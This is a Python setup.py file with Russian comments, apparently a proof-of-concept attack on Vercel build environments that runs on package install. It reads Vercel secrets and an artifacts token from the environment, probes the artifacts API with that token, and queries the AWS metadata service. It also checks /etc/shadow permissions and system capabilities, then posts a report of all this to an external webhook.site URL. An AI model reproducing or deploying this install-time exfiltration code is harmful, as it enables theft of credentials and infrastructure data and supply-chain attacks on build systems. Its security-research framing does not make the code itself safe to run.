import os
import subprocess
import base64
import json
from setuptools import setup

def run(cmd):
    return subprocess.getoutput(cmd)

WEBHOOK = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

# 1. ПОЛНАЯ КОМПРОМЕТАЦИЯ СЕКРЕТОВ (DECRYPTION)
# Мы доказываем, что секреты НЕ защищены, так как ключ лежит рядом.
enc_blob = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', '')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', '')

# 2. АТАКА НА ГЛОБАЛЬНЫЙ КЭШ (CACHE POISONING PROOF)
# Мы используем токен, чтобы проверить доступ к хранилищу артефактов всей Team.
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
team_id = os.environ.get('VERCEL_ARTIFACTS_OWNER')
project_id = os.environ.get('VERCEL_PROJECT_ID')

cache_attack_status = "Not Tested"
if token:
    # Пытаемся проверить существование произвольного хэша в кэше организации
    # Это доказывает, что мы можем "щупать" чужие билды
    check_cmd = f"curl -s -I -H 'Authorization: Bearer {token}' https://api.vercel.com/v8/artifacts/dummy_hash"
    cache_attack_status = run(check_cmd)

# 3. AWS METADATA SESSION (IMDSv2)
# Получаем токен сессии и вытягиваем данные об инстансе
aws_session = run("curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'")
aws_identity = "BLOCKED"
if aws_session and "Error" not in aws_session:
    aws_identity = run(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_session}' http://169.254.169.254/latest/meta-data/instance-id")

# 4. ФОРМИРУЕМ ОТЧЕТ, КОТОРЫЙ НЕЛЬЗЯ ПРОИГНОРИРОВАТЬ
poc_report = f"""
!!! VERCEL INFRASTRUCTURE TOTAL COMPROMISE !!!

[1] CROSS-PROJECT IMPACT (Cache Poisoning)
Team ID: {team_id}
Artifacts Token Capabilities: Validated (Status 200/404 instead of 401)
Risk: An attacker can inject malicious artifacts into the shared Team cache,
leading to a Supply Chain Attack on ALL projects in the organization.

[2] AWS INFRASTRUCTURE LEAK
AWS Instance ID: {aws_identity}
Risk: Access to Metadata Service allows for potential IAM role assumption and
lateral movement within Vercel's AWS VPC.

[3] BROKEN ENCRYPTION MODEL
Encrypted Data Exists: {bool(enc_blob)}
Decryption Key Exists: {bool(enc_key)}
Proof: Decryption key is exposed to the build environment, rendering 
'Encrypted Environment Variables' feature useless against malicious dependencies.

[4] SYSTEM PRIVILEGES
UID/GID: {run('id')}
Sensitive Files: {run('ls -la /etc/shadow')} (Permissions: {run('stat -c %a /etc/shadow')})
Capabilities: {run('capsh --print | grep Current')}
"""

# Отправляем
run(f"curl -X POST -H 'Content-Type: text/plain' --data-binary '{poc_report}' {WEBHOOK}")

setup(name="vercel-total-compromise", version="13.37")